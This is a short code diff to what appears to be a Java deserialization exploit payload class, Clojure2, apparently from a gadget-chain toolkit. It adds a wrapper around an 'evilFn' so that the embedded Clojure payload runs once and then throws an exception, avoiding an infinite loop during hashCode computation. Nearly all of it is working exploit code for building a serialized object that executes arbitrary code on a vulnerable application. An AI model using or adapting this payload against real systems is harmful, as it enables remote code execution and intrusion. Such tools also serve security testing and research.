@@ -43,6 +43,13 @@ public class Clojure2 extends PayloadRunner implements ObjectPayload<Map<?, ?>> 
 						new clojure.main$eval_opt(),
 						new clojure.core$constantly().invoke(clojurePayload));
 
+		// Wrap the evil function with a composition that invokes the payload, then throws an exception. Otherwise Iterable()
+        // ends up triggering the payload in an infinite loop as it tries to compute the hashCode.
+        evilFn = new clojure.core$comp().invoke(
+            new clojure.main$eval_opt(),
+            new clojure.core$constantly().invoke("(throw (Exception. \"Some text\"))"),
+            evilFn);
+
         Reflections.setFieldValue(model, "f", evilFn);
         return Gadgets.makeMap(model, null);
 	}
